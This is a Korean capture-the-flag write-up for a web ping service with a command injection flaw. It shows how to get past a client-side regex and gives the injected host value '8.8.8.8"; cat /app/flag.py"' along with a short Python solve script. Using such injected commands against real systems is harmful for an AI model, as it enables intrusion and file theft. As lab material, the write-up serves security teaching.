# Category

web

# Overview

특정 Host에 ping 패킷을 보내는 서비스입니다.
Command Injection을 통해 플래그를 획득하세요. 플래그는 flag.py에 있습니다.

# Analysis

- `POST` `/ping`에서 사용자가 입력한 값이 백엔드에서는 별다른 제약이 없으며 `/bin/sh`을 통해 실행된 결과가 응답된다.
- `flag.py`의 경로는 dockerfile의 `WORKDIR /app`에 따라 `/app`에 위치 한 것을 알 수 있다.

# Exploitation

1. 브라우저에서 접근할 경우 프론트에 사용자가 입력하는 host에 대한 정규식`[A-Za-z0-9.]{5,20}`이 지정되어 있어 브라우저에서 해당 부분을 삭제한다.

2. 정상적으로 실행을 때의 명령은 `ping -c 3 "8.8.8.8"`와 같은 구조를 갖기 때문에 중간 부분을 `8.8.8.8"; cat /app/flag.py"`와 같이 flag를 조회하는 명령어로 대체하여 요청할 경우 flag를 획득할 수 있다.

   ```sh
   ping -c 3 "8.8.8.8"; cat /app/flag.py""
   ```

- 파이썬 코드를 사용하게 될 경우 브라우저에 정규표현식 제약에 상관없이 flag를 획득할 수 있다.

  ```py
  # solve.py

  res = req(
      url="http://host8.dreamhack.games:12182/ping",
      method="POST",
      data={"host": f'8.8.8.8"; cat /app/flag.py"'},
  )
  ```

# Flag

`DH{pi...!!}`
